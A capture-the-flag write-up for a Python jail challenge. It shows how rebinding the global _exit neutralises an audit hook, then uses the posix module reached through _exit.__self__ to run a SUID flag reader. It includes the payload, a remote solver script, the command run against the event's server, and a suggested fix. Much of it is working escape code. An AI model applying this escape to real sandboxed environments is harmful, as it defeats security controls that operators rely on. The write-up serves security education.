# GPN CTF 2026 — no-free-lunch

- **Category:** Pwn / Python Jail
- **Challenge:** `no-free-lunch`
- **Flag:** `GPNCTF{so_m4nY_wAYS_T0_13AK_iN_NORmA1_pYtHON_U4F_0lD_BUt_gold}`

## TL;DR

The challenge runs user-controlled Python code after installing an audit hook:

```python
import heapq # the only import you'll need today
from sys import addaudithook
from os import _exit
addaudithook(lambda x,y:_exit(0))
```

At first glance, every interesting action such as `import`, `open`, or process execution should trigger the audit hook and immediately terminate the process.

However, the audit hook calls `_exit` via a global name lookup. Python globals are resolved when the lambda is executed, not when it is created. Therefore, user code can rebind `_exit` to a no-op function. Before doing so, we keep a reference to the original `posix` module via `_exit.__self__`, then call `posix.system("./read_flag")`.

Final payload:

```python
p=_exit.__self__
_exit=lambda x:None
p.system('./read_flag')
```

## Challenge Overview

The handout contained a custom CPython build, a limited standard library, and a `server.py` wrapper. The relevant files were:

```text
no-free-lunch/Dockerfile
no-free-lunch/src/server.py
no-free-lunch/src/read_flag.c
no-free-lunch/src/python
no-free-lunch/src/lib/heapq.py
no-free-lunch/src/lib/_heapq.cpython-316-x86_64-linux-gnu.so
no-free-lunch/src/0001-Rewind-in-time.patch
no-free-lunch/src/0002-Hopefully-remove-free-lunch.patch
```

The server receives input line by line until `EOF`, writes it into a temporary Python file, prepends a small jail prelude, and runs the bundled Python binary:

```python
with tempfile.NamedTemporaryFile(suffix=".py") as f:
    f.write(b"""import heapq # the only import you'll need today
from sys import addaudithook
from os import _exit
addaudithook(lambda x,y:_exit(0))
""")
    f.write(py.encode())
    f.seek(0)

    os.execve(
        "./python",
        [
            "python",
            f.name,
        ],
        {"PYTHONPATH": "./lib/"},
    )
```

The `read_flag` binary is SUID and reads `/flag`:

```c
setuid(0);
setgid(0);
int fd = open("/flag", O_RDONLY);
...
printf("Flag: %s\n", flag);
```

So the goal is to execute `./read_flag` from inside the Python jail.

## Initial Observations

The included patches make the handout look like a CPython internals challenge.

One patch modifies `_heapq.heappushpop` by removing reference count operations around the heap top item:

```diff
PyObject* top = PyList_GET_ITEM(heap, 0);
- Py_INCREF(top);
+ // Py_INCREF(top);
cmp = PyObject_RichCompareBool(top, item, Py_LT);
- Py_DECREF(top);
+ // Py_DECREF(top);
```

This strongly suggests a possible native-level object lifetime bug. However, the actual jail prelude introduced a much simpler escape route: the audit hook itself was not robust.

## Root Cause

The installed audit hook is:

```python
addaudithook(lambda x,y:_exit(0))
```

Inside the lambda, `_exit` is a global variable. It is not bound as a default argument.

That means this hook does **not** permanently store the original `os._exit` function. Whenever the hook is triggered, Python looks up the current value of `_exit` in the module globals.

So user code can do:

```python
_exit = lambda x: None
```

After that, audited operations still trigger the hook, but the hook only calls our harmless lambda.

The remaining problem is: how do we run a command without importing `os` again?

Fortunately, built-in functions such as `os._exit` are bound C functions. Their `__self__` attribute points to the underlying module object. In this case:

```python
_exit.__self__
```

returns the `posix` module.

Therefore, before overwriting `_exit`, we save that module:

```python
p = _exit.__self__
_exit = lambda x: None
p.system("./read_flag")
```

`p.system` triggers an audit event, but the audit hook now calls the overwritten no-op `_exit`, so the process continues and executes `./read_flag`.

## Local Exploit

Payload:

```python
p=_exit.__self__
_exit=lambda x:None
p.system('./read_flag')
EOF
```

Local validation used a fake local flag because the handout Dockerfile defaults to:

```dockerfile
ARG FLAG=GPNCTF{fake_flag}
```

Local output:

```text
Send your input line by line. End input with the text "EOF":

Starting Jail...
Could not find platform independent libraries <prefix>
Could not find platform dependent libraries <exec_prefix>
WARN: Could not find the standard library directory! sys.prefix is set to /usr/local, is this correct?
Flag: GPNCTF{local_fake_flag_for_validation}
```

This proves that the payload successfully escapes the Python jail and executes `./read_flag`.

## Solver

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import ssl as sslmod

PAYLOAD = """p=_exit.__self__
_exit=lambda x:None
p.system('./read_flag')
EOF
"""

def extract_flag(data: str):
    m = re.search(r"GPNCTF\{[^}\n]+\}", data)
    return m.group(0) if m else None

def recv_all(sock, timeout=2.0):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            b = sock.recv(4096)
            if not b:
                break
            chunks.append(b)
        except TimeoutError:
            break
        except socket.timeout:
            break
    return b"".join(chunks)

def run_remote(host, port, use_ssl=False):
    raw = socket.create_connection((host, port), timeout=10)
    if use_ssl:
        ctx = sslmod.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = sslmod.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw

    with s:
        banner = recv_all(s, 1.0)
        s.sendall(PAYLOAD.encode())
        out = banner + recv_all(s, 5.0)

    return out.decode("utf-8", "replace")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--ssl", action="store_true")
    args = ap.parse_args()

    out = run_remote(args.host, args.port, args.ssl)
    print(out, end="" if out.endswith("\n") else "\n")

    flag = extract_flag(out)
    if flag:
        print(f"[+] extracted flag: {flag}")
    else:
        print("[-] no flag found")

if __name__ == "__main__":
    main()
```

## Remote Exploit Proof

Command used against the official remote instance:

```bash
python3 solve_no_free_lunch.py caramelized-dumpling-nestled-in-sauteed-hollandaise-eju9.gpn24.ctf.kitctf.de 443 --ssl
```

Output:

```text
Send your input line by line. End input with the text "EOF":

Starting Jail...
Could not find platform independent libraries <prefix>
Could not find platform dependent libraries <exec_prefix>
WARN: Could not find the standard library directory! sys.prefix is set to /usr/local, is this correct?
Flag: GPNCTF{so_m4nY_wAYS_T0_13AK_iN_NORmA1_pYtHON_U4F_0lD_BUt_gold}

[+] extracted flag: GPNCTF{so_m4nY_wAYS_T0_13AK_iN_NORmA1_pYtHON_U4F_0lD_BUt_gold}
```

The flag was printed by the remote `./read_flag` binary, so this is the real challenge flag:

```text
GPNCTF{so_m4nY_wAYS_T0_13AK_iN_NORmA1_pYtHON_U4F_0lD_BUt_gold}
```

## Takeaway

Python audit hooks are useful for visibility and policy enforcement, but they are not a sandbox by themselves. In particular, if the hook callback relies on mutable globals, attacker-controlled code running in the same global namespace can change the callback behavior before triggering audited operations.

A safer version would at least bind `_exit` at hook creation time:

```python
addaudithook(lambda x, y, _exit=_exit: _exit(0))
```

Even then, relying on Python-level audit hooks alone is not sufficient for a strong sandbox boundary.
